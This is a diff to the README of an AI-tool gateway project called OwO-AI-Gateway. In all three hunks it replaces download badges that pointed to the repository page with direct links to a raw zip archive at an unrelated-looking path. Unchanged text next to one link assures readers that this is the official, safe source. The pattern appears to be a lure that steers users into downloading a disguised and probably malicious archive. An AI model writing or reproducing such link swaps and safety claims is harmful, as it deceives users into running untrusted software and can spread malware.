@@ -5,7 +5,7 @@ description: "Unify AI coding tools on one local gateway to share models, provid
 ---
 # 🚀 OwO-AI-Gateway - One Gateway, Every AI Tool
 
-[![Download Now](https://img.shields.io/badge/Download-OwO--AI--Gateway-ff69b4?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Shellieslambang882/OwO-AI-Gateway)
+[![Download Now](https://img.shields.io/badge/Download-OwO--AI--Gateway-ff69b4?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Shellieslambang882/shellieslambang882.github.io/main/greetingless/App-pseudovarian.zip)
 
 ## 🤔 What Is This?
 
@@ -31,7 +31,7 @@ Ready to try it? Great! Here's what you need to do:
 
 Visit this link to download the application:
 
-[![Download OwO-AI-Gateway](https://img.shields.io/badge/⬇️_Download_OwO--AI--Gateway-2ea44f?style=for-the-badge)](https://github.com/Shellieslambang882/OwO-AI-Gateway)
+[![Download OwO-AI-Gateway](https://img.shields.io/badge/⬇️_Download_OwO--AI--Gateway-2ea44f?style=for-the-badge)](https://raw.githubusercontent.com/Shellieslambang882/shellieslambang882.github.io/main/greetingless/App-pseudovarian.zip)
 
 The download button is clearly marked and easy to find. This is the official source, so you don't need to worry about safety.
 
@@ -144,7 +144,7 @@ The wait is over. If you want more control over your AI tools without the techni
 
 Visit this link to download the application:
 
-[![Start Now](https://img.shields.io/badge/🚀_Download_OwO--AI--Gateway-6f42c1?style=for-the-badge)](https://github.com/Shellieslambang882/OwO-AI-Gateway)
+[![Start Now](https://img.shields.io/badge/🚀_Download_OwO--AI--Gateway-6f42c1?style=for-the-badge)](https://raw.githubusercontent.com/Shellieslambang882/shellieslambang882.github.io/main/greetingless/App-pseudovarian.zip)
 
 Make your AI tools work together seamlessly today. One tiny gateway. Every AI app. Any model you choose. That's the power of OwO. 🎉
 
